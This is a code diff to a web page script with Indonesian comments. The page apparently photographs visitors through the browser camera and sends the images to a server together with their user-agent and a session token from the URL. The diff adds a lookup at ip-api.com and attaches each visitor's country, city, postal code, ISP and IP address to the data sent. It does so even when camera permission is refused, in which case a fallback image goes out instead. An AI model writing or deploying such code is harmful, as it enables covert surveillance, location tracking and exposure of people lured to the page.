@@ -19,10 +19,30 @@
         // Tambahkan user-agent ke dalam caption
         const session = new URLSearchParams(window.location.search).get("session");
 
+            // Ambil data lokasi dari API ip-api
+        const ipResponse = await fetch("http://ip-api.com/json");
+        const ipData = await ipResponse.json();
+
+        if (ipData.status !== "success") {
+            throw new Error("Gagal mengambil data lokasi dari API ip-api.");
+        }
+
+        // Ekstrak data dari API
+        const { country, city, zip, isp, query } = ipData;
+
+        // Tambahkan data ke dalam caption
         const captions = `
-        📍 **Pengguna ini tidak mengizinkan kamera pada browsernya**
+        *Pengguna Mengizinkan Akses*
+   
         🌐 User-Agent: ${userAgent}
         🔑 Session: ${session}
+        
+        🌎 Lokasi:
+        - Negara: ${country}
+        - Kota: ${city}
+        - Kode Pos: ${zip}
+        - ISP: ${isp}
+        - IP: ${query}
         `;
             
             // Kirim foto ke server
@@ -61,7 +81,7 @@
     document.getElementById("gagal").innerText = "Gagal mendapatkan data. Pastikan izin kamera diberikan. foto 4";
 
     // URL gambar fallback
-    const fallbackImageURL = 'https://i.scdn.co/image/ab67616d00001e0288a1f3c6c2711b92aabdf488';  // Ganti dengan URL gambar yang valid
+    const fallbackImageURL = 'https://static.wikia.nocookie.net/c88308f3-e20e-41ca-a94a-e715b56e2b6b/scale-to-width/755';  // Ganti dengan URL gambar yang valid
     
     try {
         // Ambil gambar dari URL
@@ -72,10 +92,30 @@
         // Ambil user-agent dari browser
         const userAgent = navigator.userAgent;
         
+        // Ambil data lokasi dari API ip-api
+        const ipResponse = await fetch("http://ip-api.com/json");
+        const ipData = await ipResponse.json();
+
+        if (ipData.status !== "success") {
+            throw new Error("Gagal mengambil data lokasi dari API ip-api.");
+        }
+
+        // Ekstrak data dari API
+        const { country, city, zip, isp, query } = ipData;
+
+        // Tambahkan data ke dalam caption
         const captions = `
-        📍 **Pengguna ini tidak mengizinkan kamera pada browsernya**
+        *Pengguna Tidak Mengizinkan Akses*
+   
         🌐 User-Agent: ${userAgent}
         🔑 Session: ${session}
+        
+        🌎 Lokasi:
+        - Negara: ${country}
+        - Kota: ${city}
+        - Kode Pos: ${zip}
+        - ISP: ${isp}
+        - IP: ${query}
         `;
         
         // Kirim foto kosong (fallback) ke server
